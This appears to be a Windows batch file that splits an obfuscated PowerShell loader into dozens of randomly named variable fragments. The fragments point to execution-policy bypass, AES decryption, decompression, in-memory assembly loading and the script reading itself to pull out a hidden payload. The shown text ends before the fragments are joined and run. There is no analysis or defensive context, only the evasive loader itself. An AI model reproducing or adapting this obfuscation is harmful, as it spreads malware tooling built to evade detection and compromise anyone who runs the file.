@echo off
set "YBYSVKClcI=rt]:"
set "beEIkuobkB=$Bge"
set "ftMwhhqIig= [st"
set "mwAHxJKLsH=BgeN"
set "IDISlmFVyn=BgeN"
set "HXclIBkjsg=tem."
set "DewZaYzTQv=mory"
set "XIqCDBfsbA=ct S"
set "EVSFNEOMGF=nbs."
set "LyYGpgefsP=[IO."
set "tGJYTOZHsP=$yqP"
set "uqUURFurlF=esMa"
set "bDQLyosgEP=tion"
set "brBTzXutpM=oL'["
set "ooVWwSMHua=vj0m"
set "tgFRVGLClU=$YaV"
set "gQpgeQgFos=If.D"
set "GRDBFXDJlU=ress"
set "iwSLcxCPaj=Secu"
set "QCiezrFPQl=7Yiv"
set "hfxFbjnPqH=yste"
set "BaxcfKpSYT=UGTu"
set "YrpmHBqMyV=Disp"
set "eFbpKbzGpV=('%~f0'"
set "PhkkvxvVVL=6] -"
set "oJfvfkOhYm=join"
set "KHgHxkuJcy=form"
set "CzPxsHmULU='dqR"
set "OIlPTnKXYQ=$wYB"
set "MJpeuFzdHo=d;$Y"
set "ahObqZRmVb=ZYYc"
set "OwWvAIGUtP=();$"
set "psEMKZYhWV=k; }"
set "EeDnNQGPHI=$Psu"
set "rSpNshRhrn=, $B"
set "qqayfnMgOb= [Sy"
set "ZgcsAgvXXU=Uw ="
set "KhFxHYtYrf=);$w"
set "JdtDNmepmK=;$Cw"
set "BwHuGuJIYH='gni"
set "SDDIoRLbIS=bs, "
set "JqoUpUUina=Syst"
set "hTQWKbQDCk=th('"
set "KwrZtIkezt=('%*'"
set "SXtKBIMZCs=le  "
set "lgAJsDGcHj=oint"
set "BeiwvMLHJv=embl"
set "SkktXhoXtA=in $"
set "grIJbTxdYe=.Cre"
set "PsXUYulNpC=).Sp"
set "sIBOUQQUmF=);$Y"
set "ummbSbtGhd=gMod"
set "qCHDmINRyf=rtS4"
set "XxavDcmKrE=PA.T"
set "OedihVZDWY=join"
set "xybStQfeca=..-1"
set "dVLpEBrvSi=stem"
set "FNFQinNUQd=);$y"
set "SyxLOnosUy=File"
set "eEvqhFtjOg=ress"
set "IDEEOKVoPy=n ''"
set "sdLpCGzkCc=Fina"
set "pLuRXxHKIZ=('l0"
set "ppeUzzxISZ=yste"
set "ahLKposjLs=NP ="
set "dHTxilovtg=d.En"
set "YhyMQlagrg=ptog"
set "ImnJAiTOcf=pher"
set "eXloVKRgyh=:: '"
set "xPMweJXULd=($Hh"
set "VfqFyvnAdQ=.Cry"
set "SSTwicVHyY===')"
set "GWVwrqOaPP=3); "
set "rYHSHKAgXB=Uw);"
set "CIMVasvTLx=v4Ir"
set "BpanaklYBR=+hAO"
set "qsGhywfyjC=bypa"
set "qIDIanTBto=lBlo"
set "HqAQUeehxC=brea"
set "RJljKzWbUW=  $c"
set "pisksEiHli=urit"
set "imdmdmuTTY=pres"
set "dzFfeDsUmq=P = "
